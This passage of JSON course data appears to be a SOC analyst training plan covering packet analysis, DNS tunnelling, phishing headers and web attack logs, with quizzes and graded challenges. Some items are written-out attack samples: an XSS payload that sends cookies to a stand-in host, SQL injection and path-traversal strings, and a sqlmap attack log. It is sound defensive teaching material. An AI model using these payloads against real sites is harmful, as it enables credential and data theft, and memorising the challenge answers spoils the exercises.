what the rule matched, then gather context: who the user is, what the host does, and what happened around that time in the SIEM. From the evidence I decide true or false positive, document what I checked and why, and either close it or escalate with everything L2 needs."],["What is the difference between an IOC and a TTP? Which is better to detect on?","An IOC is an artefact such as a hash, IP or domain. A TTP is how the attacker behaves. IOCs are cheap for the attacker to change, so detections on them expire fast. Behavioural detections sit at the top of the Pyramid of Pain and stay valid much longer."],["Explain MITRE ATT&CK to a manager in two sentences.","It is a public catalogue of what attackers do after they target an organisation, grouped by goal. We use it as a shared language to describe incidents and to check which attacker behaviours we can and cannot detect."]],"res":[["read","The Pyramid of Pain, the original article","https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html","David Bianco",10,1],["read","ATT&CK Enterprise matrix: open three techniques each under Initial Access, Execution and Persistence","https://attack.mitre.org/","MITRE",25,1],["read","The Cyber Kill Chain","https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html","Lockheed Martin",10,0],["read","The Unified Kill Chain","https://www.unifiedkillchain.com/","Paul Pols",15,0],["video","SOC Core Skills course, pay what you can (16 h in total; start session 1)","https://www.antisyphontraining.com/product/soc-core-skills-with-john-strand/","Antisyphon, John Strand",120,0],["practice","Real intrusion reports to map to ATT&CK","https://thedfirreport.com/","The DFIR Report",30,0],["video","Security+ SY0-701 free video course: use it as a lookup for any concept that feels shaky","https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sy0-701-comptia-security-plus-course/","Professor Messer",60,0],["tool","ATT&CK Navigator: colour the techniques from your breach write-up","https://mitre-attack.github.io/attack-navigator/","MITRE",20,0],["read","D3FEND: the defensive counterpart to ATT&CK","https://d3fend.mitre.org/","MITRE",15,0],["read","T1566.001 Spearphishing Attachment: read one technique page end to end","https://attack.mitre.org/techniques/T1566/001/","MITRE ATT&CK",10,0]],"check":"I can name the 7 Kill Chain phases in order and explain tactic versus technique without notes."},{"title":"Reading the wire","module":"Networking core and Wireshark","goal":"Open a packet capture and say who talked to whom, on which port, and whether it looks like a scan or normal traffic.","tasks":[["room","Network Traffic Basics",1,"networktrafficbasics","Network Traffic Analysis"],["room","Wireshark: The Basics",1,"wiresharkthebasics","Network Traffic Analysis"],["room","Wireshark: Packet Operations",1,"wiresharkpacketoperations","Network Traffic Analysis"],["room","Wireshark: Traffic Analysis",1,"wiresharktrafficanalysis","Network Traffic Analysis"],["room","NetworkMiner",1,"networkminer","Network Traffic Analysis"],["pwn","pwn.college, Intro to Cybersecurity dojo, module \"Intercepting Communication\": watch the IP and TCP lectures, solve the first 6 challenges",2],["own","Capture 2 minutes of your own traffic in Wireshark. Find one DNS query, one TCP handshake and one TLS Client Hello",0.5]],"lesson":"\u003cp>You marked networking as weak. It is also the area that separates analysts who guess from analysts who know, so this stage gives it two full weeks.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>TCP handshake\u003c/b>: SYN, SYN-ACK, ACK. Open port answers SYN with SYN-ACK. Closed port answers with RST.\u003c/li>\n\u003cli>\u003cb>Ports\u003c/b>: 22 SSH, 25 SMTP, 53 DNS, 80 HTTP, 88 Kerberos, 135 RPC, 389 LDAP, 443 HTTPS, 445 SMB, 3389 RDP.\u003c/li>\n\u003cli>\u003cb>Layers\u003c/b>: Ethernet/MAC (2), IP (3), TCP/UDP (4), application (7). ARP maps IP to MAC inside one LAN.\u003c/li>\n\u003cli>\u003cb>Capture filter\u003c/b> (BPF, decides what is saved) versus \u003cb>display filter\u003c/b> (hides packets already captured).\u003c/li>\u003c/ul>\n\u003ch4>Cheat sheet\u003c/h4>\n\u003cpre>ip.addr == 10.0.0.5                       traffic to or from a host\ntcp.port == 445                            one port\ntcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0   SYN only (scan hunting)\nhttp.request.method == \"POST\"              uploads and logins\ndns.qry.name contains \"evil\"               DNS lookups\narp.duplicate-address-detected             ARP spoofing\nStatistics &gt; Conversations                 top talkers, first stop in any pcap\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Starting to read packets one by one. Always start with Statistics (Protocol Hierarchy, Conversations, Endpoints), then filter.\u003c/p>","quiz":[{"q":"What is the correct order of the TCP three-way handshake?","o":["SYN, ACK, SYN-ACK","SYN, SYN-ACK, ACK","ACK, SYN, SYN-ACK","SYN-ACK, SYN, ACK"],"a":1,"why":"Client SYN, server SYN-ACK, client ACK."},{"q":"A host sends a SYN to a closed TCP port. What normally comes back?","o":["SYN-ACK","Nothing, always","RST","FIN"],"a":2,"why":"A closed port replies RST (shown as RST, ACK). Silence usually means a firewall dropped it."},{"q":"Which Wireshark display filter shows HTTP requests involving 10.0.0.5?","o":["host 10.0.0.5 and port 80","ip.addr == 10.0.0.5 && http.request","http.host = 10.0.0.5","tcp contains 10.0.0.5"],"a":1,"why":"\"host ... and port ...\" is capture-filter (BPF) syntax, not display-filter syntax."},{"q":"Which sign points to ARP poisoning on a LAN?","o":["Many DNS queries","One MAC address claiming the gateway IP and another host's IP","TLS on port 443","A TTL of 64"],"a":1,"why":"The attacker answers ARP for IPs it does not own, so one MAC maps to several IPs."},{"q":"At which OSI layer does IP operate?","o":["Layer 2","Layer 3","Layer 4","Layer 7"],"a":1,"why":"IP is the network layer (3). TCP and UDP are layer 4."},{"q":"What is the difference between a capture filter and a display filter?","o":["There is none","Capture filters decide what is recorded; display filters only hide recorded packets","Display filters are faster","Capture filters work only on Wi-Fi"],"a":1,"why":"A packet excluded by a capture filter is gone for good."},{"q":"Which port and protocol does a normal DNS query use?","o":["TCP 53 only","UDP 53","UDP 35","TCP 443"],"a":1,"why":"Queries normally use UDP 53. TCP 53 appears for large responses and zone transfers."}],"chal":{"title":"Identify the scan","brief":"This is tshark output from a server subnet. Work out who is scanning, what they found, and how you would isolate it in Wireshark.","evidence":"# tshark -r capture.pcap -T fields  (time  src -> dst  ports  flags)\n0.000100  10.0.0.23 -> 10.0.0.5   51000 -> 21    [SYN]\n0.000180  10.0.0.5  -> 10.0.0.23  21 -> 51000    [RST, ACK]\n0.000310  10.0.0.23 -> 10.0.0.5   51000 -> 22    [SYN]\n0.000395  10.0.0.5  -> 10.0.0.23  22 -> 51000    [SYN, ACK]\n0.000450  10.0.0.23 -> 10.0.0.5   51000 -> 22    [RST]\n0.000520  10.0.0.23 -> 10.0.0.5   51000 -> 23    [SYN]\n0.000600  10.0.0.5  -> 10.0.0.23  23 -> 51000    [RST, ACK]\n0.000710  10.0.0.23 -> 10.0.0.5   51000 -> 80    [SYN]\n0.000790  10.0.0.5  -> 10.0.0.23  80 -> 51000    [SYN, ACK]\n0.000840  10.0.0.23 -> 10.0.0.5   51000 -> 80    [RST]\n0.000910  10.0.0.23 -> 10.0.0.5   51000 -> 443   [SYN]\n0.000990  10.0.0.5  -> 10.0.0.23  443 -> 51000   [RST, ACK]\n0.001100  10.0.0.23 -> 10.0.0.5   51000 -> 445   [SYN]\n0.001185  10.0.0.5  -> 10.0.0.23  445 -> 51000   [SYN, ACK]\n0.001240  10.0.0.23 -> 10.0.0.5   51000 -> 445   [RST]\n0.001320  10.0.0.23 -> 10.0.0.5   51000 -> 3389  [SYN]\n0.001400  10.0.0.5  -> 10.0.0.23  3389 -> 51000  [RST, ACK]","qs":[{"p":"IP address of the scanner","h":["xvj2ahznv9"],"hint":""},{"p":"Open ports on the target, ascending, comma separated","h":["278et5vqvid"],"hint":"Example: 21,25"},{"p":"The scanner never completes the handshake. What is this scan type called?","h":["1dl8vnt0m5r","1311inlxqwi","57j5nwvl6t","7iatvhoiur","jl5hco30cz","1jemoy9h2e3","20e6rw4wzjc","q5sgmyaagn","1r0xn1p2ccf","3lh3g5gcr8","15qx36crocd"],"hint":""},{"p":"Wireshark display filter that shows only the scanner's SYN packets without ACK","h":["23ky7phy9ip","167nikgg96s","qdwli7ru0c","103ssgdhitt","93n3undnxq","1lzp96ekmeg","2f58lxv9zmv","2dko6z5rk1l","x5yjtx0psy"],"hint":"Spaces are ignored"}]},"iv":[["What happens, at the network level, when you type a URL and press Enter?","The host resolves the name with DNS (UDP 53), gets an IP, uses ARP to find the MAC of the gateway, opens a TCP connection with a three-way handshake to port 443, negotiates TLS, then sends the HTTP request and receives the response."],["How would you spot a port scan in a packet capture?","One source sending SYN packets to many ports or hosts in a short time, with mostly RST replies and few completed handshakes. In Wireshark I would check Statistics, Conversations, then filter on tcp.flags.syn==1 and tcp.flags.ack==0."],["TCP versus UDP: give one security-relevant difference.","TCP is connection-oriented, so a handshake proves both sides can talk and makes spoofing harder. UDP has no handshake, which makes source spoofing easy and is why it is used in amplification attacks."]],"res":[["video","Networking Fundamentals, Module 1 playlist: lessons 1 to 4","https://www.youtube.com/playlist?list=PLIFyRwBY_4bRLmKfP1KnZA6rZbRHtxmXi","Practical Networking",90,1],["video","Wireshark Masterclass: lessons 1 to 5","https://www.youtube.com/results?search_query=Chris%20Greer%20Wireshark%20Masterclass%20lesson%201","Chris Greer (YouTube search)",60,1],["video","Lectures on IP, TCP and ARP on the module page","https://pwn.college/intro-to-cybersecurity/intercepting-communication","pwn.college",60,0],["read","The OSI model explained","https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/","Cloudflare Learning",10,0],["read","Display filter reference: keep it open while you work","https://www.wireshark.org/docs/dfref/","Wireshark",10,0],["practice","Sample captures to open and explore","https://wiki.wireshark.org/SampleCaptures","Wireshark Wiki",30,0],["read","What is TCP/IP?","https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/","Cloudflare Learning",10,0],["read","Port scanning techniques: what each scan type sends and receives","https://nmap.org/book/man-port-scanning-techniques.html","Nmap reference guide",20,0],["read","Capture filter syntax (BPF)","https://www.tcpdump.org/manpages/pcap-filter.7.html","tcpdump",10,0],["read","Wireshark User's Guide","https://www.wireshark.org/docs/wsug_html_chunked/","Wireshark",30,0]],"check":"I can describe the TCP handshake and write three Wireshark display filters from memory."},{"title":"Watching the perimeter","module":"Network security monitoring","goal":"Recognise scanning, man-in-the-middle, tunnelling and exfiltration from network logs, and read a Snort rule.","tasks":[["room","Network Security Essentials",1,"networksecurityessentials","Network Security Monitoring"],["room","Network Discovery Detection",1,"networkdiscoverydetection","Network Security Monitoring"],["room","Data Exfiltration Detection",1,"dataexfildetection","Network Security Monitoring"],["room","Man-in-the-Middle Detection",1,"mitmdetection","Network Security Monitoring"],["room","IDS Fundamentals",1,"idsfundamentals","Network Security Monitoring"],["room","Snort",1,"snort","Network Security Monitoring"],["pwn","pwn.college \"Intercepting Communication\": continue through the sniffing and ARP challenges (aim for 8 more)",2],["own","Write two Snort rules from memory: one for ICMP to your subnet, one for TCP SYN to port 3389. Check the syntax against the docs",0.5]],"lesson":"\u003cp>Most attacks have to cross the network at least twice: once to get in, once to talk home. Network monitoring catches both even when the endpoint is blind.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>IDS\u003c/b> watches and alerts. \u003cb>IPS\u003c/b> sits inline and can drop traffic.\u003c/li>\n\u003cli>\u003cb>Snort rule\u003c/b>: \u003ccode>action proto src_ip src_port -> dst_ip dst_port (options)\u003c/code>.\u003c/li>\n\u003cli>\u003cb>Beaconing\u003c/b>: connections at a regular interval with similar size, to the same destination.\u003c/li>\n\u003cli>\u003cb>DNS tunnelling\u003c/b>: many long, random-looking subdomains of one domain, often TXT queries, from one client.\u003c/li>\n\u003cli>\u003cb>Exfiltration\u003c/b>: unusual outbound volume, odd hours, new destination. Compare bytes out with the host's baseline.\u003c/li>\n\u003cli>\u003cb>Zeek logs\u003c/b>: conn.log (every connection), dns.log, http.log, ssl.log, files.log.\u003c/li>\u003c/ul>\n\u003ch4>Cheat sheet\u003c/h4>\n\u003cpre>alert tcp any any -> $HOME_NET 3389 (msg:\"RDP SYN\"; flags:S; sid:1000001; rev:1;)\nalert icmp any any -> $HOME_NET any (msg:\"ICMP in\"; sid:1000002; rev:1;)\nalert udp any any -> any 53 (msg:\"Large DNS\"; dsize:>100; sid:1000003; rev:1;)\n\ncat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes | sort | uniq -c | sort -nr | head\necho 686f73743d | xxd -r -p        decode hex\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Calling every big upload exfiltration. Check the destination and the host's role first: a backup server uploading at 03:00 is its job.\u003c/p>","quiz":[{"q":"What can an IPS do that an IDS cannot?","o":["Read encrypted traffic","Block traffic inline","Generate alerts","Use signatures"],"a":1,"why":"An IPS is deployed inline and can drop packets. An IDS only observes and alerts."},{"q":"Which is the correct layout of a Snort rule header?","o":["proto action src -> dst","action proto src_ip src_port -> dst_ip dst_port","action dst \u003c- src proto","msg action proto"],"a":1,"why":"Example: alert tcp any any -> $HOME_NET 22."},{"q":"Which pattern most strongly suggests DNS tunnelling?","o":["A few queries for www.google.com","Hundreds of long random subdomains of one domain from one host","A query answered with NXDOMAIN","DNS over UDP 53"],"a":1,"why":"Data is encoded into subdomain labels, so you see many unique, long, high-entropy names under one parent domain."},{"q":"A workstation connects to the same external IP every 60 seconds, each time sending about 300 bytes. What is the likely explanation?","o":["Video streaming","C2 beaconing","A port scan","ARP poisoning"],"a":1,"why":"Regular interval plus consistent small size is the classic beacon signature."},{"q":"What does Zeek conn.log record?","o":["Only DNS queries","A summary of every connection: endpoints, ports, duration, bytes","Full packet payloads","Windows event logs"],"a":1,"why":"conn.log is the flow record and the starting point for most Zeek investigations."},{"q":"Which attack is the usual way to become man-in-the-middle on a local network?","o":["SQL injection","ARP spoofing","Kerberoasting","Password spraying"],"a":1,"why":"Poisoning ARP caches redirects victims' traffic through the attacker."},{"q":"A database server uploads 40 GB to an unknown external host at 03:00. What is the best first check?","o":["Reboot the server","Compare with the host's normal outbound volume and identify the destination","Ignore it; nights are for backups","Delete the database"],"a":1,"why":"Baseline and destination ownership decide whether this is a backup job or exfiltration."}],"chal":{"title":"Data leaving through DNS","brief":"A night-shift alert says \"unusual DNS volume\". Find the infected client and recover what it leaked. Copy the log into a file and use cut, grep and xxd, or CyberChef.","evidence":"# dns.log (time, client, type, query) - night of 2026-11-14\n03:14:02  10.10.5.12  A    www.google.com\n03:14:05  10.10.5.44  TXT  00.686f73743d46.cdn-telemetry.net\n03:14:10  10.10.5.31  A    outlook.office365.com\n03:14:13  10.10.5.44  TXT  01.494e2d50432d.cdn-telemetry.net\n03:14:18  10.10.5.12  A    ctldl.windowsupdate.com\n03:14:21  10.10.5.44  TXT  02.30373b757365.cdn-telemetry.net\n03:14:26  10.10.5.44  A    teams.microsoft.com\n03:14:29  10.10.5.44  TXT  03.723d6a736d69.cdn-telemetry.net\n03:14:34  10.10.5.20  A    github.com\n03:14:37  10.10.5.44  TXT  04.74683b706173.cdn-telemetry.net\n03:14:42  10.10.5.31  A    time.windows.com\n03:14:45  10.10.5.44  TXT  05.733d57696e74.cdn-telemetry.net\n03:14:50  10.10.5.12  A    fonts.gstatic.com\n03:14:53  10.10.5.44  TXT  06.657232303236.cdn-telemetry.net\n03:14:58  10.10.5.20  A    pypi.org\n03:15:01  10.10.5.44  TXT  07.21.cdn-telemetry.net","qs":[{"p":"IP of the client doing the tunnelling","h":["1j2cdp93pm5"],"hint":""},{"p":"Parent domain used for the tunnel","h":["14izdqr8o4p","1xafj8bs9rh"],"hint":""},{"p":"How many queries carried data to that domain?","h":["25i2gekeftp"],"hint":"A number"},{"p":"Join the hex labels in order and decode them. What password was stolen?","h":["1pxbe106rhy"],"hint":"Case does not matter here"},{"p":"Snort option that matches on payload size, as in \"___:>100;\"","h":["1e9250wxl1j"],"hint":"One keyword"}]},"iv":[["How would you detect C2 beaconing?","Look for connections from one host to the same destination at regular intervals with similar sizes, often to a rare or newly registered domain. Flow logs or Zeek conn.log sorted by connection count and interval variance reveal it even when traffic is encrypted."],["IDS or IPS: which would you deploy and where?","IPS inline at the perimeter for high-confidence signatures, because it can block. IDS on internal segments and for noisier rules, because a false positive there only creates an alert and does not break traffic."],["What makes DNS attractive for data exfiltration?","DNS is almost always allowed out, is rarely inspected, and can carry data in subdomain labels and TXT answers. Indicators are long random-looking subdomains, high query volume to one domain, and unusual record types."]],"res":[["read","Zeek log formats: read conn.log and dns.log","https://docs.zeek.org/en/master/logs/index.html","Zeek docs",20,1],["video","Spotting scans and malware traffic in Wireshark","https://www.youtube.com/results?search_query=Chris%20Greer%20Wireshark%20nmap%20scan%20malware%20traffic%20analysis","Chris Greer (YouTube search)",30,1],["read","How DNS tunnelling works and what it looks like","https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/","Unit 42",15,0],["read","Snort 3 rule writing guide","https://docs.snort.org/","Snort",20,0],["read","What is DNS?","https://www.cloudflare.com/learning/dns/what-is-dns/","Cloudflare Learning",10,0],["practice","Traffic analysis exercises with real malware pcaps","https://www.malware-traffic-analysis.net/training-exercises.html","malware-traffic-analysis.net",60,0],["tool","Try Zeek in the browser on sample pcaps","https://try.zeek.org/","Zeek",30,0],["read","Suricata rules documentation, the modern sibling of Snort rules","https://docs.suricata.io/","Suricata",20,0],["read","Threat hunting blog: beacon analysis and long connections","https://www.activecountermeasures.com/blog/","Active Countermeasures",20,0],["read","Daily handler diaries: short real-world network detections","https://isc.sans.edu/","SANS Internet Storm Center",15,0],["read","Security Onion documentation: how a full NSM stack fits together","https://docs.securityonion.net/","Security Onion",20,0]],"check":"I can explain beaconing, DNS tunnelling and exfiltration and read a Snort rule aloud."},{"title":"The inbox is the front door","module":"Phishing analysis","goal":"Read raw email headers, judge SPF, DKIM and DMARC results, and extract indicators safely.","tasks":[["room","Phishing Analysis Fundamentals",1,"phishingemails1tryoe","Phishing Analysis"],["room","Phishing Emails in Action",1,"phishingemails2rytmuv","Phishing Analysis"],["room","Phishing Analysis Tools",1,"phishingemails3tryoe","Phishing Analysis"],["room","Phishing Prevention",1,"phishingemails4gkxh","Phishing Analysis"],["room","The Greenholt Phish",1,"phishingemails5fgjlzxc","Phishing Analysis"],["room","Snapped Phish-ing Line",1,"snappedphishingline","Phishing Analysis"],["thm","TryHackMe SOC Simulator: run the introductory phishing scenario once and note your score",1.5],["own","Open a real spam email from your own mailbox, view the original headers, and write down sending IP, SPF result and Reply-To",0.5]],"lesson":"\u003cp>Phishing is the most common first alert for a junior analyst, and the SAL1 exam simulator leans on it. Being fast and correct here pays twice.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>SPF\u003c/b>: is the sending IP allowed to send for the envelope-from (Return-Path) domain?\u003c/li>\n\u003cli>\u003cb>DKIM\u003c/b>: a signature proving the message was signed by that domain and not altered.\u003c/li>\n\u003cli>\u003cb>DMARC\u003c/b>: does the visible From domain align with a passing SPF or DKIM, and what should the receiver do if not (none, quarantine, reject)?\u003c/li>\n\u003cli>\u003cb>Received headers\u003c/b> are added by each server. Read them bottom to top to follow the path.\u003c/li>\n\u003cli>\u003cb>From\u003c/b> is what the user sees and is trivially forged. \u003cb>Return-Path\u003c/b> and \u003cb>Reply-To\u003c/b> show where bounces and replies really go.\u003c/li>\n\u003cli>\u003cb>Defang\u003c/b> indicators before sharing: hxxp://bad[.]example.\u003c/li>\u003c/ul>\n\u003ch4>Workflow\u003c/h4>\n\u003cpre>1. Headers: sender IP, Return-Path, Reply-To, auth results\n2. Body: urgency, mismatch between link text and real href\n3. URLs: defang, check reputation, never click from your workstation\n4. Attachments: hash it (sha256sum), look the hash up, sandbox if unknown\n5. Scope: who else received it? did anyone click?\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>\"SPF pass\" does not mean safe. An attacker who owns evil-domain.example passes SPF for evil-domain.example perfectly.\u003c/p>","quiz":[{"q":"What does SPF verify?","o":["That the body was not altered","That the sending IP is authorised for the envelope-from domain","That the recipient exists","That the attachment is clean"],"a":1,"why":"SPF is a DNS record listing which IPs may send for a domain."},{"q":"What does DKIM add to an email?","o":["Encryption of the body","A cryptographic signature tied to the sending domain","A spam score","The sender's IP"],"a":1,"why":"DKIM signs selected headers and the body, so tampering and domain forgery are detectable."},{"q":"What does DMARC check?","o":["Attachment types","That the visible From domain aligns with passing SPF or DKIM, and applies a policy","TLS version","The size of the email"],"a":1,"why":"DMARC ties the user-visible From to the authenticated domain and tells receivers what to do on failure."},{"q":"How do you follow the real path of an email through servers?","o":["Read the Subject","Read the Received headers from bottom to top","Trust the From field","Read the Received headers top to bottom"],"a":1,"why":"Each hop prepends a Received header, so the oldest hop is at the bottom."},{"q":"Which is a correctly defanged URL?","o":["http://evil.com","hxxp://evil[.]com","http//evil.com","evil dot com slash"],"a":1,"why":"Defanging stops accidental clicks and auto-linking while keeping the indicator readable."},{"q":"What is the safest way to assess a suspicious attachment?","o":["Open it to see what happens","Compute its hash, check reputation, and detonate in a sandbox if unknown","Forward it to colleagues","Rename it to .txt and open"],"a":1,"why":"Never open on a production workstation. Hash lookup first, sandbox second."},{"q":"An email with no link and no attachment asks finance to pay an invoice urgently, appearing to come from the CEO. What is this?","o":["Ransomware","Business email compromise","DNS tunnelling","A worm"],"a":1,"why":"BEC relies on impersonation and urgency. There is no malware for tools to catch."}],"chal":{"title":"Dissect a reported email","brief":"A user clicked \"Report phishing\". These are the raw headers and what the gateway extracted from the body.","evidence":"Return-Path: \u003cbounce@mailer-contosopay-secure.example>\nReceived: from mx.northwind.example (10.0.1.5) by mbx02.northwind.example; Thu, 12 Nov 2026 09:14:27 +0200\nReceived: from mail.mailer-contosopay-secure.example (unknown [203.0.113.77])\n        by mx.northwind.example with ESMTP; Thu, 12 Nov 2026 09:14:25 +0200\nAuthentication-Results: mx.northwind.example;\n        spf=fail (sender IP is 203.0.113.77) smtp.mailfrom=mailer-contosopay-secure.example;\n        dkim=none; dmarc=fail action=none header.from=contosopay.example\nFrom: \"Contoso Pay Support\" \u003cservice@contosopay.example>\nReply-To: helpdesk.contosopay@freemail-box.example\nTo: i.munteanu@northwind.example\nSubject: Action required: your account is limited\nDate: Thu, 12 Nov 2026 09:14:20 +0200\n\n--- extracted by gateway ---\nLink text : https://www.contosopay.example/signin\nLink href : hxxps://contosopay-signin[.]verify-portal[.]example/login.php\nAttachment: Statement_Nov.pdf.exe  (sha256 4b1e0c6f5a2d9e8b7c3a1f0d6e5b4c3a2918f7e6d5c4b3a291807f6e5d4c3b2a)","qs":[{"p":"IP address of the server that handed the mail to Northwind","h":["1dznytdlwio"],"hint":""},{"p":"SPF result","h":["2176gz7bzos"],"hint":"One word"},{"p":"If the user replies, which address receives it?","h":["1in5w48i9hs"],"hint":""},{"p":"Registered domain the link really leads to (not the subdomain)","h":["1qft1rbj506","15m56ap5fn7"],"hint":""},{"p":"What makes the attachment name suspicious? Name the trick","h":["vn035o1mxq","1lml5xk25jr","1fm7lra4rz0"],"hint":"Two words"}]},"iv":[["An employee reports a suspicious email. What are your steps?","Get the original with headers. Check sender, Return-Path, Reply-To and the SPF, DKIM and DMARC results. Examine links and attachments without opening them: defang, hash, reputation, sandbox. Then scope it: who else received it and whether anyone clicked. Finally contain: block sender and URL, purge the message, reset credentials if needed."],["An email passes SPF, DKIM and DMARC. Is it safe?","Not necessarily. Those checks only prove the mail really came from the domain it claims. An attacker can register a lookalike domain and pass all three, or send from a compromised legitimate mailbox."],["What is the difference between phishing and business email compromise?","Phishing usually carries a link or attachment to steal credentials or run malware. BEC often has neither: it impersonates a trusted person and asks for a payment or data, so it depends on process checks rather than malware detection."]],"res":[["video","Email Security: SPF, DKIM and DMARC","https://www.youtube.com/watch?v=v6ht9efsnRI","Professor Messer",8,1],["tool","Learn DMARC: send a test email and watch each check run","https://www.learndmarc.com/","learndmarc.com",15,1],["read","What are DMARC, DKIM and SPF?","https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/","Cloudflare Learning",10,0],["tool","Message Header Analyzer","https://mha.azurewebsites.net/","Microsoft",5,0],["tool","Email header analyzer","https://mxtoolbox.com/EmailHeaders.aspx","MXToolbox",5,0],["tool","Scan a suspicious URL without visiting it","https://urlscan.io/","urlscan.io",5,0],["tool","Message header analyser","https://toolbox.googleapps.com/apps/messageheader/","Google Admin Toolbox",5,0],["tool","PhishTool: a phishing analysis console with a free community tier","https://www.phishtool.com/","PhishTool",20,0],["tool","Check whether a URL is a known phish","https://phishtank.org/","PhishTank",5,0],["read","T1566 Phishing and its sub-techniques","https://attack.mitre.org/techniques/T1566/","MITRE ATT&CK",10,0]],"check":"I can explain SPF, DKIM and DMARC in one sentence each and list my five triage steps."},{"title":"Attacks in the access log","module":"Web security monitoring","goal":"Spot SQL injection, XSS, path traversal and brute force in web logs, and judge whether the attack worked.","tasks":[["room","Web Security Essentials",1,"websecurityessentials","Web Security Monitoring"],["room","Detecting Web Attacks",1,"detectingwebattacks","Web Security Monitoring"],["room","Detecting Web Shells",1,"detectingwebshells","Web Security Monitoring"],["room","Detecting Web DDoS",1,"detectingwebddos","Web Security Monitoring"],["pwn","pwn.college, Intro to Cybersecurity, module \"Web Security\": first 8 challenges (path traversal, command injection, SQL injection)",2.5]],"lesson":"\u003cp>You will defend web apps better once you have attacked one, which is why this week pairs THM log analysis with pwn.college exploitation of the same bug classes.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>Access log fields\u003c/b>: client IP, time, request line, status, size, referrer, user agent.\u003c/li>\n\u003cli>\u003cb>Status codes\u003c/b>: 200 OK, 301/302 redirect, 401 not authenticated, 403 forbidden, 404 not found, 500 server error.\u003c/li>\n\u003cli>\u003cb>SQL injection\u003c/b>: \u003ccode>' OR 1=1--\u003c/code>, \u003ccode>UNION SELECT\u003c/code>, often URL-encoded (%27 is a quote, %20 a space).\u003c/li>\n\u003cli>\u003cb>XSS\u003c/b>: \u003ccode>&lt;script&gt;\u003c/code>, \u003ccode>onerror=\u003c/code>, \u003ccode>document.cookie\u003c/code> in a parameter.\u003c/li>\n\u003cli>\u003cb>Path traversal\u003c/b>: \u003ccode>../../etc/passwd\u003c/code>, or encoded \u003ccode>..%2f\u003c/code>.\u003c/li>\n\u003cli>\u003cb>Brute force\u003c/b>: many POST /login from one IP with 401, then a 200 or 302.\u003c/li>\u003c/ul>\n\u003ch4>Cheat sheet\u003c/h4>\n\u003cpre>awk '{print $1}' access.log | sort | uniq -c | sort -nr | head     top client IPs\nawk '$9==401' access.log | awk '{print $1}' | sort | uniq -c       failed logins per IP\ngrep -Ei \"union|select|%27|\\.\\./|&lt;script\" access.log             attack strings\nawk '{print $9}' access.log | sort | uniq -c                        status code spread\u003c/pre>\n\u003ch4>Did it work?\u003c/h4>\u003cp>Look at status and size. A 200 with a much larger response than normal, or a 500 followed by a 200, suggests the injection returned data. A wall of 403 or 404 suggests it was blocked or missed.\u003c/p>","quiz":[{"q":"What is the difference between HTTP 401 and 403?","o":["None","401 means not authenticated; 403 means authenticated or identified but not allowed","401 is a server error","403 means the page does not exist"],"a":1,"why":"401 asks for credentials. 403 refuses regardless of credentials."},{"q":"A request contains id=1%27%20OR%20%271%27=%271. What is being attempted?","o":["XSS","SQL injection","Path traversal","CSRF"],"a":1,"why":"Decoded: id=1' OR '1'='1, a classic always-true SQL condition."},{"q":"A comment field value of \u003cscript>fetch(\"//x.example/?c=\"+document.cookie)\u003c/script> is an attempt at what?","o":["Command injection","Cross-site scripting to steal cookies","SQL injection","Brute force"],"a":1,"why":"Injected JavaScript running in other users' browsers and sending their cookies out."},{"q":"Which log pattern indicates a login brute-force attack?","o":["One GET / per minute","Dozens of POST /login from one IP with status 401 within seconds","A single 404","Many 304 responses"],"a":1,"why":"High rate, same endpoint, repeated authentication failures from one source."},{"q":"At which layer does a web application firewall inspect traffic?","o":["Layer 2","Layer 3","Layer 4","Layer 7"],"a":3,"why":"A WAF understands HTTP: URLs, parameters, headers and bodies."},{"q":"What is a request for /download?file=../../../../etc/passwd?","o":["Path traversal","XSS","SSRF","A normal download"],"a":0,"why":"The ../ sequences climb out of the intended directory to read system files."},{"q":"A SQL injection request returns status 200 and a response ten times larger than normal. What does that suggest?","o":["The WAF blocked it","The injection may have succeeded and returned extra data","The server is down","Nothing useful"],"a":1,"why":"Response size is one of the best clues for whether data came back."}],"chal":{"title":"Three attackers, one log","brief":"Copy this access log to a file and analyse it with grep and awk. Three different sources are attacking the shop.","evidence":"# /var/log/apache2/access.log - shop.northwind.example\n10.0.0.15 - - [12/Nov/2026:10:01:44 +0200] \"GET / HTTP/1.1\" 200 8120 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.23 - - [12/Nov/2026:10:02:11 +0200] \"GET /products?id=1 HTTP/1.1\" 200 5123 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n198.51.100.23 - - [12/Nov/2026:10:02:12 +0200] \"GET /products?id=1%27 HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n198.51.100.23 - - [12/Nov/2026:10:02:13 +0200] \"GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 48211 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n198.51.100.23 - - [12/Nov/2026:10:02:15 +0200] \"GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 200 9120 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\"\n10.0.0.22 - - [12/Nov/2026:10:03:02 +0200] \"GET /cart HTTP/1.1\" 200 3310 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)\"\n203.0.113.9 - - [12/Nov/2026:10:04:01 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" \"python-requests/2.32.3\"\n203.0.113.9 - - [12/Nov/2026:10:04:01 +0200] \"POST /login HTTP/1.1\" 401 310 \"-\" 